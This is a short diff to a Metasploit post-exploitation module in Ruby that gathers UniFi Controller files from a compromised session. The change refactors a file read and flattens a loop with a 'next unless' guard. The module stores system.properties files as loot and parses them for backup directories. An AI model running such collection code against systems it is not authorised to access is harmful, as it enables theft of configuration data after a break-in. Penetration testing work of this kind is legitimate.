@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Post
     temp_file = Rex::Quickfile.new("fixed_zip")
     system("yes | #{zip_exe} -FF #{fname} --out #{temp_file.path}.zip > /dev/null")
     if $? == 0
-      return File.open("#{temp_file.path}.zip", 'rb') { |f| f.read}
+      return File.read("#{temp_file.path}.zip")
     else
       print_error('Error fixing zip.  Attempt manually.')
       nil
@@ -137,22 +137,21 @@ class MetasploitModule < Msf::Post
 
     # https://help.ubnt.com/hc/en-us/articles/205202580-UniFi-system-properties-File-Explanation
     sprop_locations.each do |sprop|
-      if exists?(sprop)
-        begin
-          data = read_file(sprop)
-          loot_path = store_loot('ubiquiti.system.properties', 'text/plain', session, data, sprop)
-          vprint_status("File #{sprop} saved to #{loot_path}")
-          print_good("Read UniFi Controller file #{sprop}")
-        rescue Rex::Post::Meterpreter::RequestError => e
-          print_error("Failed to read #{sprop}")
-          data = ''
-        end
-        data.each_line do |line|
-          unless line.chomp.empty? || line =~ /^#/
-            if /^autobackup\.dir\s*=\s*(?<d>.+)$/ =~ line
-              backup_locations.append(d.strip)
-              vprint_status("Custom autobackup directory identified: #{d.strip}")
-            end
+      next unless exists?(sprop)
+      begin
+        data = read_file(sprop)
+        loot_path = store_loot('ubiquiti.system.properties', 'text/plain', session, data, sprop)
+        vprint_status("File #{sprop} saved to #{loot_path}")
+        print_good("Read UniFi Controller file #{sprop}")
+      rescue Rex::Post::Meterpreter::RequestError => e
+        print_error("Failed to read #{sprop}")
+        data = ''
+      end
+      data.each_line do |line|
+        unless line.chomp.empty? || line =~ /^#/
+          if /^autobackup\.dir\s*=\s*(?<d>.+)$/ =~ line
+            backup_locations.append(d.strip)
+            vprint_status("Custom autobackup directory identified: #{d.strip}")
           end
         end
       end
